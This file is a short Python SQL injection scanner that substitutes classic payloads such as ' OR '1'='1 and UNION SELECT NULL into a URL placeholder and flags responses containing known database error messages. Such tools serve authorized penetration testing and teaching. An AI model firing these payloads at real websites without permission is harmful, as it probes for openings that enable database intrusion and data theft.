import requests

# SQLi payloads
PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' UNION SELECT NULL -- ",
    "' OR 1=1#",
]

# Common database error patterns
ERROR_PATTERNS = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "Unclosed quotation mark",
    "quoted string not properly terminated",
    "SQLSTATE[HY000]",
]

def scan(url: str):
    """
    Test the given URL for SQL Injection vulnerabilities.
    """

    print(f"[INFO] Starting SQLi scan on: {url}")

    for payload in PAYLOADS:
        # Replace 'test' placeholder with payload
        test_url = url.replace("test", payload)

        try:
            response = requests.get(test_url, timeout=5)

            # Look for SQL error patterns
            for error in ERROR_PATTERNS:
                if error.lower() in response.text.lower():
                    print(f"[VULNERABLE] Possible SQLi detected with payload: {payload}")
                    print(f"[ERROR PATTERN] Found: {error}")
                    break
            else:
                print(f"[OK] No SQL errors for payload: {payload}")

        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Request failed for payload {payload}: {e}")

    print("[INFO] SQLi scan complete.")
